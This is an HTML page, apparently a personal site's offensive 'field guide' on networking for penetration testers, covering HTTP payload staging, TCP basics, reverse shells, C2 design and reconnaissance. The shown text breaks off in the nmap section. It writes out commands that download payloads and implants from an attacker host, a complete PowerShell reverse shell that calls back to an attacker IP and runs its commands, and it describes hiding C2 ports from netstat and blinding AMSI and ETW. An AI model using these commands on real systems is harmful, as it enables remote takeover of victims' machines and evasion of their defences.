@@ -1,0 +1,1121 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>George Wu | NETWORKING — Operator's Field Guide — 22DIV</title>
+<meta name="description" content="Networking tradecraft for penetration testers. HTTP staging, reverse shells, C2 architecture, lateral movement, pivoting, and payload delivery.">
+<meta name="author" content="George Wu">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://rainfantry.github.io/networking.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="George Wu | NETWORKING — Operator's Field Guide">
+<meta property="og:description" content="Networking tradecraft for penetration testers. HTTP staging, C2, lateral movement, pivoting.">
+<meta property="og:url" content="https://rainfantry.github.io/networking.html">
+<meta property="og:site_name" content="22DIV — George Wu">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+:root {
+  --bg: #0c0c0c;
+  --bg2: #111;
+  --bg3: #161616;
+  --green: #00ff41;
+  --green2: #00cc33;
+  --green3: #009922;
+  --amber: #ffb000;
+  --red: #ff4444;
+  --cyan: #00e5ff;
+  --blue: #4488ff;
+  --dim: #555;
+  --muted: #888;
+  --text: #ccc;
+  --bright: #eee;
+  --mono: 'Cascadia Code', 'Consolas', 'Source Code Pro', 'Courier New', monospace;
+}
+
+html { scroll-behavior: smooth; }
+
+body {
+  font-family: var(--mono);
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.7;
+  min-height: 100vh;
+}
+
+body::after {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,255,65,0.008) 3px, rgba(0,255,65,0.008) 4px);
+  pointer-events: none;
+  z-index: 999;
+}
+
+.container { max-width: 900px; margin: 0 auto; padding: 2rem 1.5rem; }
+
+/* ── HEADER ── */
+.header {
+  padding: 3rem 0 2rem;
+  border-bottom: 1px solid #1a1a1a;
+  margin-bottom: 3rem;
+}
+
+.header h1 {
+  font-size: 1.8rem;
+  color: var(--green);
+  font-weight: 400;
+  letter-spacing: 0.15em;
+  margin-bottom: 0.5rem;
+}
+
+.header .sub {
+  color: var(--muted);
+  font-size: 0.85rem;
+}
+
+.header .sub span { color: var(--dim); }
+
+/* ── NAV ── */
+nav {
+  position: sticky;
+  top: 0;
+  background: rgba(12,12,12,0.95);
+  backdrop-filter: blur(8px);
+  border-bottom: 1px solid #1a1a1a;
+  z-index: 100;
+  padding: 0.6rem 0;
+}
+
+nav .inner {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 0 1.5rem;
+  display: flex;
+  gap: 1.5rem;
+  align-items: center;
+  flex-wrap: wrap;
+}
+
+nav a {
+  color: var(--green2);
+  text-decoration: none;
+  font-size: 0.75rem;
+  letter-spacing: 0.08em;
+  transition: color 0.2s;
+}
+
+nav a:hover { color: var(--green); text-shadow: 0 0 8px rgba(0,255,65,0.4); }
+nav .brand { color: var(--green); font-weight: 600; letter-spacing: 0.12em; }
+nav a.nav-red { color: var(--red); }
+nav a.nav-red:hover { color: #ff6666; text-shadow: 0 0 8px rgba(255,68,68,0.4); }
+nav a.nav-blue { color: #4488ff; }
+nav a.nav-blue:hover { color: #6699ff; text-shadow: 0 0 8px rgba(68,136,255,0.4); }
+nav a.nav-yellow { color: var(--amber); }
+nav a.nav-yellow:hover { color: #ffc040; text-shadow: 0 0 8px rgba(255,176,0,0.4); }
+nav a.nav-pink { color: #ff2d8a; }
+nav a.nav-pink:hover { color: #ff5ca8; text-shadow: 0 0 8px rgba(255,45,138,0.4); }
+nav a.nav-green { color: var(--green); font-weight: 600; }
+nav a.nav-green:hover { color: #33ff66; text-shadow: 0 0 12px rgba(0,255,65,0.6); }
+nav a.nav-cyan { color: var(--cyan); }
+nav a.nav-cyan:hover { color: #33eeff; text-shadow: 0 0 8px rgba(0,229,255,0.4); }
+nav a.nav-purple { color: #b366ff; }
+nav a.nav-purple:hover { color: #cc88ff; text-shadow: 0 0 8px rgba(179,102,255,0.4); }
+
+.nav-links {
+  display: flex;
+  gap: 1.5rem;
+  align-items: center;
+  flex: 1;
+}
+
+.hamburger {
+  display: none;
+  background: none;
+  border: 1px solid var(--dim);
+  color: var(--green);
+  font-size: 1.2rem;
+  padding: 0.2rem 0.6rem;
+  cursor: pointer;
+  border-radius: 3px;
+  line-height: 1;
+}
+.hamburger:hover { background: rgba(0,255,65,0.1); }
+
+.theme-btn {
+  background: none;
+  border: 1px solid var(--dim);
+  color: var(--amber);
+  font-size: 0.85rem;
+  padding: 0.15rem 0.4rem;
+  cursor: pointer;
+  border-radius: 3px;
+  margin-left: auto;
+}
+.theme-btn:hover { background: rgba(255,176,0,0.1); }
+
+/* ── TOC ── */
+.toc {
+  background: var(--bg2);
+  border: 1px solid #1e1e1e;
+  border-radius: 6px;
+  padding: 1.5rem;
+  margin-bottom: 3rem;
+}
+
+.toc .label {
+  color: var(--dim);
+  font-size: 0.7rem;
+  letter-spacing: 0.1em;
+  margin-bottom: 1rem;
+}
+
+.toc a {
+  display: block;
+  color: var(--green2);
+  text-decoration: none;
+  font-size: 0.8rem;
+  padding: 0.25rem 0;
+  transition: color 0.2s;
+}
+
+.toc a:hover { color: var(--green); }
+
+.toc .num {
+  color: var(--dim);
+  margin-right: 0.8rem;
+  font-size: 0.7rem;
+}
+
+/* ── SECTIONS ── */
+.section {
+  margin-bottom: 4rem;
+  padding-bottom: 2rem;
+  border-bottom: 1px solid #141414;
+}
+
+.section:last-child { border-bottom: none; }
+
+.section h2 {
+  color: var(--green);
+  font-size: 1.1rem;
+  font-weight: 400;
+  letter-spacing: 0.1em;
+  margin-bottom: 1.5rem;
+  padding-bottom: 0.5rem;
+  border-bottom: 1px solid #1a1a1a;
+}
+
+.section h3 {
+  color: var(--amber);
+  font-size: 0.9rem;
+  font-weight: 400;
+  margin: 1.5rem 0 0.8rem;
+}
+
+.section p {
+  color: var(--text);
+  font-size: 0.85rem;
+  margin-bottom: 0.8rem;
+  max-width: 75ch;
+}
+
+.section p strong { color: var(--bright); font-weight: 600; }
+.section p em { color: var(--muted); font-style: italic; }
+
+/* ── TERMINAL BLOCK ── */
+.term {
+  background: var(--bg2);
+  border: 1px solid #1e1e1e;
+  border-radius: 6px;
+  padding: 1.2rem 1.5rem;
+  margin: 1.5rem 0;
+  overflow-x: auto;
+  font-size: 0.82rem;
+  line-height: 1.8;
+  position: relative;
+}
+
+.term::before {
+  content: attr(data-title);
+  position: absolute;
+  top: 0;
+  right: 0;
+  background: #1a1a1a;
+  color: var(--dim);
+  padding: 0.15rem 0.6rem;
+  font-size: 0.7rem;
+  border-radius: 0 6px 0 4px;
+}
+
+.term .cmd { color: var(--bright); }
+.term .out { color: var(--muted); }
+.term .out-green { color: var(--green2); }
+.term .out-amber { color: var(--amber); }
+.term .out-red { color: var(--red); }
+.term .out-cyan { color: var(--cyan); }
+.term .comment { color: var(--dim); font-style: italic; }
+
+.prompt { color: var(--green2); user-select: none; }
+.prompt::before { content: 'vader@22div'; color: var(--green3); }
+.prompt::after { content: ' $ '; color: var(--dim); }
+
+.prompt-target { color: var(--red); user-select: none; }
+.prompt-target::before { content: 'target'; color: #cc3333; }
+.prompt-target::after { content: ' > '; color: var(--dim); }
+
+/* ── DIAGRAM ── */
+.diagram {
+  background: var(--bg2);
+  border: 1px solid #1e1e1e;
+  border-radius: 6px;
+  padding: 1.5rem;
+  margin: 1.5rem 0;
+  font-size: 0.78rem;
+  line-height: 1.6;
+  color: var(--green2);
+  overflow-x: auto;
+  white-space: pre;
+}
+
+/* ── CALLOUT ── */
+.callout {
+  border-left: 3px solid var(--amber);
+  background: rgba(255,176,0,0.05);
+  padding: 0.8rem 1.2rem;
+  margin: 1.2rem 0;
+  font-size: 0.8rem;
+  color: var(--text);
+}
+
+.callout-red {
+  border-left-color: var(--red);
+  background: rgba(255,68,68,0.05);
+}
+
+.callout-green {
+  border-left-color: var(--green);
+  background: rgba(0,255,65,0.05);
+}
+
+.callout strong { color: var(--bright); }
+
+/* ── TAGS ── */
+.tag {
+  display: inline-block;
+  padding: 0.1rem 0.5rem;
+  font-size: 0.7rem;
+  border-radius: 3px;
+  margin-right: 0.3rem;
+  font-weight: 600;
+  letter-spacing: 0.05em;
+}
+
+.tag-tcp { background: #001a00; color: var(--green); border: 1px solid #003300; }
+.tag-udp { background: #1a1400; color: var(--amber); border: 1px solid #2a2000; }
+.tag-http { background: #001a1a; color: var(--cyan); border: 1px solid #002a2a; }
+.tag-smb { background: #0a0020; color: #aa88ff; border: 1px solid #1a0040; }
+.tag-dns { background: #1a0a00; color: #ff8844; border: 1px solid #2a1400; }
+
+/* ── FOOTER ── */
+footer {
+  border-top: 1px solid #1a1a1a;
+  padding: 2rem 0;
+  text-align: center;
+  color: var(--dim);
+  font-size: 0.75rem;
+}
+
+footer a { color: var(--green); text-decoration: none; }
+footer a:hover { color: var(--green2); text-shadow: 0 0 8px rgba(0,255,65,0.4); }
+
+/* ── LIGHT THEME ── */
+[data-theme="light"] {
+  --bg: #f5f5f0; --bg2: #eaeae5; --bg3: #e0e0db;
+  --green: #006622; --green2: #008833; --green3: #00aa44;
+  --amber: #cc8800; --red: #cc2222; --cyan: #0099bb;
+  --blue: #2266cc; --dim: #aaa; --muted: #666; --text: #333; --bright: #111;
+}
+[data-theme="light"] body { background: var(--bg); color: var(--text); }
+[data-theme="light"] body::after { display: none; }
+[data-theme="light"] nav { background: rgba(245,245,240,0.95); border-bottom-color: #ccc; }
+[data-theme="light"] .term { background: #1a1a1a; color: #ccc; }
+[data-theme="light"] .term .out { color: #888; }
+[data-theme="light"] .term .cmd { color: #eee; }
+[data-theme="light"] .term .out-green { color: #00cc33; }
+[data-theme="light"] .term .out-amber { color: #ffb000; }
+[data-theme="light"] .term .out-red { color: #ff4444; }
+[data-theme="light"] .diagram { background: #1a1a1a; color: #00cc33; }
+[data-theme="light"] .callout { background: rgba(0,0,0,0.03); }
+
+/* ── RESPONSIVE ── */
+@media (max-width: 768px) {
+  .hamburger { display: block; }
+  .nav-links {
+    display: none;
+    flex-direction: column;
+    width: 100%;
+    padding: 0.5rem 0;
+    gap: 0.5rem;
+    align-items: flex-start;
+  }
+  .nav-links.show { display: flex; }
+  nav .inner { flex-wrap: wrap; justify-content: space-between; }
+}
+
+@media (max-width: 640px) {
+  .container { padding: 1rem; }
+  .term { padding: 0.8rem 1rem; font-size: 0.75rem; }
+  .header h1 { font-size: 1.4rem; }
+}
+</style>
+</head>
+<body>
+
+<nav>
+  <div class="inner">
+    <a href="index.html" class="brand">22DIV</a>
+    <button class="hamburger" id="navToggle" aria-label="Toggle menu" aria-expanded="false">&#9776;</button>
+    <div class="nav-links" id="navLinks">
+      <a href="index.html">home</a>
+      <a href="journal.html">journal</a>
+      <a href="books.html" class="nav-red">field manual</a>
+      <a href="csec.html" class="nav-red">kill chain</a>
+      <a href="rootkit.html" class="nav-blue">rootkit manual</a>
+      <a href="networking.html" class="nav-green">networking</a>
+      <a href="fuzzer.html" class="nav-yellow">fuzzer</a>
+      <a href="report.html" class="nav-pink">book report</a>
+      <a href="defender.html" class="nav-cyan">DEFENDER</a>
+      <a href="reverseeng.html" class="nav-purple">reverse eng</a>
+      <button class="theme-btn" id="themeToggle" aria-label="Toggle theme">&#9788;</button>
+    </div>
+  </div>
+</nav>
+
+<div class="container" id="top">
+
+<!-- ═══════ HEADER ═══════ -->
+<div class="header">
+  <h1>NETWORKING // OPERATOR'S FIELD GUIDE</h1>
+  <div class="sub">
+    22DIV / george wu <span>//</span> pentester networking tradecraft <span>//</span> HTTP staging, C2, lateral movement
+  </div>
+</div>
+
+<!-- ═══════ TOC ═══════ -->
+<div class="toc">
+  <div class="label">TABLE OF CONTENTS</div>
+  <a href="#staging"><span class="num">01</span> HTTP File Staging</a>
+  <a href="#tcp"><span class="num">02</span> TCP/IP for Operators</a>
+  <a href="#reverse"><span class="num">03</span> Reverse Shells</a>
+  <a href="#c2"><span class="num">04</span> C2 Architecture</a>
+  <a href="#recon"><span class="num">05</span> Network Reconnaissance</a>
+  <a href="#lateral"><span class="num">06</span> Lateral Movement</a>
+  <a href="#pivot"><span class="num">07</span> Port Forwarding &amp; Pivoting</a>
+  <a href="#delivery"><span class="num">08</span> Payload Delivery Methods</a>
+  <a href="#evasion"><span class="num">09</span> Network Evasion</a>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 01: HTTP FILE STAGING                              -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="staging">
+<h2>01 // HTTP FILE STAGING</h2>
+
+<p>The fastest way to move files between machines on a network. One command turns any folder into a web server. Every file in that directory becomes a downloadable URL. No setup, no FTP, no SMB shares, no USB drives.</p>
+
+<h3>How It Works</h3>
+
+<div class="diagram">┌──────────────────────────────────┐
+│  Attacker (192.168.1.92)         │
+│  ┌────────────────────────┐      │
+│  │  /staging/              │      │
+│  │  ├── payload.exe        │ ──── │ ──▶ http://192.168.1.92:9090/payload.exe
+│  │  ├── implant.dll        │ ──── │ ──▶ http://192.168.1.92:9090/implant.dll
+│  │  └── driver.sys         │ ──── │ ──▶ http://192.168.1.92:9090/driver.sys
+│  └────────────────────────┘      │
+│  python -m http.server 9090      │  ◀── listening on 0.0.0.0 (all interfaces)
+└──────────┬───────────────────────┘
+           │
+           │  LAN (same subnet)
+           │
+┌──────────▼───────────────────────┐
+│  Target (192.168.1.50)           │
+│  Invoke-WebRequest ...           │  ◀── normal HTTP GET download
+│  -OutFile payload.exe            │
+└──────────────────────────────────┘</div>
+
+<h3>Start the Server</h3>
+
+<div class="term" data-title="attacker">
+<span class="comment"># serve current directory on port 9090</span>
+<span class="prompt"></span><span class="cmd">cd /opt/staging &amp;&amp; python3 -m http.server 9090</span>
+<span class="out">Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...</span>
+<span class="out-green">127.0.0.1 - - [19/Jun/2026 14:32:01] "GET /payload.exe HTTP/1.1" 200 -</span>
+<span class="out-green">192.168.1.50 - - [19/Jun/2026 14:32:15] "GET /payload.exe HTTP/1.1" 200 -</span>
+<span class="out-green">192.168.1.50 - - [19/Jun/2026 14:32:18] "GET /implant.dll HTTP/1.1" 200 -</span>
+</div>
+
+<p>Every successful download shows a <strong>200</strong> response in the server log. A <strong>404</strong> means the file doesn't exist in the directory you're serving. A connection timeout means the target can't reach your IP (firewall, wrong subnet, server not running).</p>
+
+<h3>Pull Files on Target</h3>
+
+<div class="term" data-title="target — powershell">
+<span class="comment"># PowerShell (Windows target)</span>
+<span class="prompt-target"></span><span class="cmd">Invoke-WebRequest http://192.168.1.92:9090/payload.exe -OutFile payload.exe</span>
+<span class="prompt-target"></span><span class="cmd">Invoke-WebRequest http://192.168.1.92:9090/implant.dll -OutFile implant.dll</span>
+<br>
+<span class="comment"># Verify file integrity (compare sizes)</span>
+<span class="prompt-target"></span><span class="cmd">(Get-Item payload.exe).Length</span>
+<span class="out">153088</span>
+</div>
+
+<div class="term" data-title="target — linux">
+<span class="comment"># Linux target — wget or curl</span>
+<span class="prompt"></span><span class="cmd">wget http://192.168.1.92:9090/payload.elf</span>
+<span class="out">--2026-06-19 14:33:22--  http://192.168.1.92:9090/payload.elf</span>
+<span class="out">Connecting to 192.168.1.92:9090... connected.</span>
+<span class="out">HTTP request sent, awaiting response... <span class="out-green">200 OK</span></span>
+<span class="out">Length: 48256 (47K)</span>
+<span class="out">Saving to: 'payload.elf'</span>
+<span class="out-green">payload.elf         100%[==================>]  47.13K  --.-KB/s    in 0.001s</span>
+<br>
+<span class="comment"># Or curl</span>
+<span class="prompt"></span><span class="cmd">curl http://192.168.1.92:9090/payload.elf -o payload.elf</span>
+</div>
+
+<h3>Troubleshooting</h3>
+
+<div class="callout">
+<strong>404 Not Found:</strong> You're hitting a server, but the file isn't there. Either you're serving the wrong directory, or another process is listening on that port. Diagnose with <code>netstat -ano | findstr ":9090"</code> — if you see two PIDs, you have a port conflict.
+</div>
+
+<div class="callout-red callout">
+<strong>OPSEC:</strong> Kill the server when done (<code>Ctrl+C</code>). While running, anyone on your network can browse that directory. <code>python -m http.server</code> has no authentication — it's an open door.
+</div>
+
+<h3>Port Conflict Diagnosis</h3>
+
+<div class="term" data-title="attacker — diagnosis">
+<span class="comment"># check who's listening on port 8080</span>
+<span class="prompt"></span><span class="cmd">netstat -ano | findstr ":8080"</span>
+<span class="out">  TCP    0.0.0.0:8080    0.0.0.0:0    LISTENING    6216</span>
+<span class="out">  TCP    [::]:8080       [::]:0       LISTENING    46768</span>
+<br>
+<span class="comment"># two PIDs! identify them</span>
+<span class="prompt"></span><span class="cmd">Get-Process -Id 6216 | Select-Object ProcessName</span>
+<span class="out-amber">httpd</span>  <span class="comment"># Apache stole our port</span>
+<span class="prompt"></span><span class="cmd">Get-Process -Id 46768 | Select-Object ProcessName</span>
+<span class="out-green">python</span>  <span class="comment"># our server got the IPv6 socket only</span>
+<br>
+<span class="comment"># fix: use a different port</span>
+<span class="prompt"></span><span class="cmd">python -m http.server 9090</span>
+<span class="out">Serving HTTP on 0.0.0.0 port 9090 ...</span>
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 02: TCP/IP FOR OPERATORS                           -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="tcp">
+<h2>02 // TCP/IP FOR OPERATORS</h2>
+
+<p>Every connection you make — HTTP staging, reverse shells, C2 beacons, lateral movement — is TCP or UDP underneath. Understanding the handshake tells you what <code>netstat</code> output means and why connections fail.</p>
+
+<h3>The Three-Way Handshake</h3>
+
+<div class="diagram">Client                          Server
+  │                                │
+  │ ──── SYN (seq=100) ──────▶   │   "I want to connect"
+  │                                │
+  │ ◀──── SYN-ACK (ack=101) ──── │   "OK, I'm listening"
+  │                                │
+  │ ──── ACK (ack=1) ────────▶   │   "Connection established"
+  │                                │
+  │ ◀════ DATA ══════════════▶   │   bidirectional communication
+  │                                │
+  │ ──── FIN ────────────────▶   │   "I'm done"
+  │ ◀──── FIN-ACK ───────────    │   "Acknowledged, me too"
+  │                                │</div>
+
+<p><strong>SYN</strong> = synchronize. <strong>ACK</strong> = acknowledge. <strong>FIN</strong> = finish. Every TCP connection goes through this dance. When a port scan sends a SYN and gets SYN-ACK back, the port is open. RST back = closed. Silence = filtered (firewall dropped it).</p>
+
+<h3>Port Ranges</h3>
+
+<div class="term" data-title="port classification">
+<span class="out-amber">Well-Known    (0-1023)</span>      <span class="out">HTTP=80, HTTPS=443, SSH=22, SMB=445, DNS=53, RDP=3389</span>
+<span class="out-green">Registered    (1024-49151)</span>  <span class="out">MySQL=3306, PostgreSQL=5432, WinRM=5985, Metasploit=4444</span>
+<span class="out-cyan">Dynamic       (49152-65535)</span> <span class="out">Ephemeral ports — OS assigns these for outbound connections</span>
+</div>
+
+<h3>Reading netstat</h3>
+
+<div class="term" data-title="connection states">
+<span class="prompt-target"></span><span class="cmd">netstat -ano | findstr "ESTABLISHED"</span>
+<span class="out">  TCP    192.168.1.50:49832    192.168.1.92:8080     ESTABLISHED    3412</span>
+<span class="out">  TCP    192.168.1.50:49844    13.107.42.14:443      ESTABLISHED    1088</span>
+<span class="out">  TCP    192.168.1.50:49901    192.168.1.92:4444     ESTABLISHED    7720</span>
+<br>
+<span class="comment"># reading: local_ip:local_port → remote_ip:remote_port STATE PID</span>
+<span class="comment"># port 49832→8080 = HTTP C2 beacon</span>
+<span class="comment"># port 49844→443  = legit HTTPS (microsoft)</span>
+<span class="comment"># port 49901→4444 = reverse shell callback</span>
+<br>
+<span class="prompt-target"></span><span class="cmd">netstat -ano | findstr "LISTENING"</span>
+<span class="out">  TCP    0.0.0.0:135      0.0.0.0:0    LISTENING    892</span>
+<span class="out">  TCP    0.0.0.0:445      0.0.0.0:0    LISTENING    4</span>
+<span class="out">  TCP    0.0.0.0:5985     0.0.0.0:0    LISTENING    4</span>
+<br>
+<span class="comment"># 0.0.0.0 = listening on ALL interfaces (reachable from network)</span>
+<span class="comment"># 127.0.0.1 = localhost only (not reachable from network)</span>
+</div>
+
+<div class="callout">
+<strong>PowerShell gotcha:</strong> <code>sc</code> in PowerShell is aliased to <code>Set-Content</code>, not the service control manager. Use <code>sc.exe query</code> to query services. Same trap: <code>curl</code> is aliased to <code>Invoke-WebRequest</code>. Always use <code>curl.exe</code> on Windows if you want the real curl.
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 03: REVERSE SHELLS                                 -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="reverse">
+<h2>03 // REVERSE SHELLS</h2>
+
+<p>A reverse shell makes the <strong>target connect back to you</strong>. This bypasses inbound firewall rules — most firewalls block inbound but allow outbound. The attacker listens; the target calls home.</p>
+
+<div class="diagram">┌─────────────┐                    ┌─────────────┐
+│  Attacker    │                    │   Target     │
+│  LISTENING   │ ◀════ TCP ════════ │  CONNECTS    │
+│  on :4444    │                    │  OUT to :4444│
+│              │                    │              │
+│  nc -lvnp    │   target initiates │  powershell  │
+│  4444        │   the connection   │  reverse     │
+└─────────────┘                    └─────────────┘
+
+  Bind Shell = opposite: target LISTENS, attacker connects IN
+  (blocked by most firewalls → reverse shell preferred)</div>
+
+<h3>Listener Setup (Attacker)</h3>
+
+<div class="term" data-title="attacker — listener">
+<span class="comment"># netcat listener — catches the incoming shell</span>
+<span class="prompt"></span><span class="cmd">nc -lvnp 4444</span>
+<span class="out">listening on [any] 4444 ...</span>
+<span class="out-green">connect to [192.168.1.92] from (UNKNOWN) [192.168.1.50] 49832</span>
+<span class="out">Microsoft Windows [Version 10.0.19045]</span>
+<span class="out">(c) Microsoft Corporation. All rights reserved.</span>
+<br>
+<span class="out">C:\Users\target&gt;</span><span class="cmd">whoami</span>
+<span class="out">radon_laptop1\ghaleb jomma</span>
+<br>
+<span class="out">C:\Users\target&gt;</span><span class="cmd">ipconfig | findstr "IPv4"</span>
+<span class="out">   IPv4 Address. . . . . . . : 192.168.1.50</span>
+</div>
+
+<h3>PowerShell Reverse Shell (Target)</h3>
+
+<div class="term" data-title="target — callback">
+<span class="comment"># PowerShell reverse shell one-liner</span>
+<span class="prompt-target"></span><span class="cmd">$c = New-Object Net.Sockets.TCPClient('192.168.1.92',4444)</span>
+<span class="prompt-target"></span><span class="cmd">$s = $c.GetStream()</span>
+<span class="prompt-target"></span><span class="cmd">$w = New-Object IO.StreamWriter($s)</span>
+<span class="prompt-target"></span><span class="cmd">$r = New-Object IO.StreamReader($s)</span>
+<span class="prompt-target"></span><span class="cmd">while($true){$w.Write('PS> '); $w.Flush(); $d = $r.ReadLine(); $o = iex $d 2>&amp;1 | Out-String; $w.Write($o); $w.Flush()}</span>
+</div>
+
+<div class="callout-red callout">
+<strong>Detection:</strong> Raw TCP reverse shells trigger Defender's behavioral monitoring. AMSI scans the PowerShell commands. ETW-TI logs the socket creation. This is why VADER's kill chain blinds AMSI and ETW <em>before</em> establishing the shell.
+</div>
+
+<h3>Common Ports for Shells</h3>
+
+<div class="term" data-title="port selection">
+<span class="out-amber">4444</span>  <span class="out">— Metasploit default. Known to every SOC analyst. Use for testing only.</span>
+<span class="out-green">443</span>   <span class="out">— HTTPS port. Blends with legit traffic. Many firewalls allow outbound 443.</span>
+<span class="out-green">80</span>    <span class="out">— HTTP port. Same logic. May conflict with web servers.</span>
+<span class="out-cyan">53</span>    <span class="out">— DNS port. Often allowed through even strict firewalls.</span>
+<span class="out-amber">8080</span>  <span class="out">— Alt-HTTP. Common but watched. Port conflicts with dev servers.</span>
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 04: C2 ARCHITECTURE                                -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="c2">
+<h2>04 // C2 ARCHITECTURE</h2>
+
+<p>Command &amp; Control (C2) is the persistent communication channel between attacker and implant. Unlike a one-shot reverse shell, C2 is designed for <strong>long-term access</strong> — beaconing at intervals, receiving tasking, exfiltrating data.</p>
+
+<h3>HTTP Beacon (Most Common)</h3>
+
+<div class="diagram">Implant                                  C2 Server
+  │                                          │
+  │ ── GET /news/feed.json ──────────▶      │  check-in (sleep 60s + jitter)
+  │ ◀── 200 OK {"task":"whoami"} ────       │  server queues commands
+  │                                          │
+  │    ... implant executes whoami ...       │
+  │                                          │
+  │ ── POST /api/telemetry ──────────▶      │  send results back
+  │     body: {output: "nt authority\system"}│
+  │ ◀── 200 OK ──────────────────────       │  acknowledged
+  │                                          │
+  │    ... sleep 60s ± 15s jitter ...        │  jitter prevents pattern detection
+  │                                          │
+  │ ── GET /news/feed.json ──────────▶      │  next check-in
+  │ ◀── 200 OK {"task":"none"} ──────       │  nothing to do
+  │                                          │</div>
+
+<p><strong>Sleep</strong> controls how often the implant checks in. Shorter = more responsive but more traffic. <strong>Jitter</strong> adds randomness to the interval (e.g., 60s ± 15s) so check-ins don't happen at exact intervals — exact intervals are a detection signature.</p>
+
+<h3>C2 Channel Types</h3>
+
+<div class="term" data-title="channel comparison">
+<span class="out-green">HTTP/HTTPS</span>   <span class="tag tag-http">HTTP</span>
+<span class="out">  Blends with web traffic. HTTPS encrypts payload. Most C2 frameworks default here.</span>
+<span class="out">  Detected by: proxy logs, SSL inspection, JA3 fingerprinting, domain reputation.</span>
+<br>
+<span class="out-amber">DNS Tunneling</span>   <span class="tag tag-dns">DNS</span>
+<span class="out">  Data encoded in DNS queries (TXT, CNAME, A records). Slow but hard to block</span>
+<span class="out">  — most networks MUST allow DNS. Detection: anomalous query volume, long labels.</span>
+<br>
+<span class="out-cyan">SMB Named Pipes</span>   <span class="tag tag-smb">SMB</span>
+<span class="out">  Internal-only. Implant-to-implant comms through named pipes over SMB (port 445).</span>
+<span class="out">  No internet traffic = invisible to perimeter monitoring. Used for pivoting.</span>
+<br>
+<span class="out-red">ICMP Tunneling</span>
+<span class="out">  Data embedded in ping packets. Extremely slow. Niche — most envs allow ICMP.</span>
+<span class="out">  Detection: unusual ICMP packet sizes, high volume pings.</span>
+<br>
+<span class="out-amber">Raw TCP</span>   <span class="tag tag-tcp">TCP</span>
+<span class="out">  Direct socket. Fast but obvious — custom protocol on a non-standard port.</span>
+<span class="out">  Detected by: port scanning, traffic analysis, IDS signatures.</span>
+</div>
+
+<h3>VADER's C2 Architecture</h3>
+
+<div class="term" data-title="vader c2 flow">
+<span class="comment"># VADER uses HTTP staging + reverse shell</span>
+<span class="out">1. vader_stager.exe  →  downloads payload.dll via HTTP (port 8080)</span>
+<span class="out">2. vader_inject.exe  →  injects payload into target process</span>
+<span class="out">3. vader_shell.exe   →  reverse shell callback (port 4444)</span>
+<span class="out">4. cloak.dll         →  hides ports 8080 + 4444 from netstat</span>
+<br>
+<span class="out-green">With cloak active:</span>
+<span class="prompt-target"></span><span class="cmd">netstat -ano | findstr "8080 4444"</span>
+<span class="out">[no output — connections hidden by NtDeviceIoControlFile hook]</span>
+</div>
+
+</div>
+
+<!-- ═══════════════════════════════════════════════════════════ -->
+<!-- SECTION 05: NETWORK RECONNAISSANCE                         -->
+<!-- ═══════════════════════════════════════════════════════════ -->
+<div class="section" id="recon">
+<h2>05 // NETWORK RECONNAISSANCE</h2>
+
+<p>Before you move laterally, you need to know what's on the network. Recon answers: what hosts are alive, what ports are open, what services are running, and what's the network topology.</p>
+
+<h3>Host Discovery</h3>
+
+<div class="term" data-title="find live hosts">
+<span class="comment"># ARP scan — who's on the local subnet (layer 2, fast, silent)</span>
+<span class="prompt"></span><span class="cmd">arp -a</span>
+<span class="out">Interface: 192.168.1.92 --- 0xa</span>
+<span class="out">  Internet Address    Physical Address    Type</span>
+<span class="out">  192.168.1.1         aa:bb:cc:dd:ee:01   dynamic   </span><span class="comment"># gateway/router</span>
+<span class="out">  192.168.1.50        aa:bb:cc:dd:ee:50   dynamic   </span><span class="comment"># radon laptop</span>
+<span class="out">  192.168.1.55        aa:bb:cc:dd:ee:55   dynamic   </span><span class="comment"># unknown device</span>
+<span class="out">  192.168.1.255       ff:ff:ff:ff:ff:ff   static    </span><span class="comment"># broadcast</span>
+<br>
+<span class="comment"># Ping sweep — slower but works across subnets</span>
+<span class="prompt"></span><span class="cmd">for i in $(seq 1 254); do ping -c 1 -W 1 192.168.1.$i &amp;>/dev/null &amp;&amp; echo "192.168.1.$i alive"; done</span>
+<span class="out-green">192.168.1.1 alive</span>
+<span class="out-green">192.168.1.50 alive</span>
+<span class="out-green">192.168.1.55 alive</span>
+<span class="out-green">192.168.1.92 alive</span>
+</div>
+
+<h3>Port Scanning (nmap)</h3>
+
+<div class="term" data-title="nmap — the standard">
+<span class="comment"># quick top-1000 port scan</span>
+<span class="prompt"></span><span class="cmd">nmap 192.168.1.50</span>
+<span class="out">Starting Nmap 7.94 ( https://nmap.org )</span>
+<span class="out">Nmap scan report for 192.168.1.50</span>
+<span class="out">Host is up (0.0031s latency).</span>
+<span class="out">Not shown: 995 closed tcp ports</span>
+<span class="out">PORT     STATE SERVICE</span>
+<span class="out-green">135/tcp  open  msrpc</span>
+<span class="out-green">139/tcp  open  netbios-ssn</span>
+<span class="out-green">445/tcp  open  microsoft-ds</span>
+<span class="out-green">3389/tcp open  ms-wrd-rdp</span>
+<span class="out-green">5985/tcp open  wsman</span>
+<br>
+<span class="comment"># service version detection (-sV) + OS detection (-O)</span>
+<span class="prompt"></span><span class="cmd">nmap -sV -O 192.168.1.50</span>
+<span class="out">PORT     STATE SERVICE       VERSION</span>
+<span class="out">445/tcp  open  microsoft-ds  Windows 10 Pro 19045</span>
+<span class="out">5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span>
